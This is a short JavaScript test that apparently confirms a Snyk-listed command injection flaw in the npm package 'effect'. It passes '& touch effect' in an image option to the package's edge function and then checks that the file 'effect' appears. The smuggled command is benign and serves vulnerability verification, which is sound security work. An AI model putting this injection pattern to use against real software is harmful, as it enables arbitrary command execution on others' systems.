//https://snyk.io/vuln/SNYK-JS-EFFECT-564256
test("Command Injection in effect", () => {
  const Root = require("effect");
  const fs = require("fs");
  const path = "./effect";
  const sleep = require("sleep");
  var options = { image: "& touch effect" };
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  Root.edge(options, function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
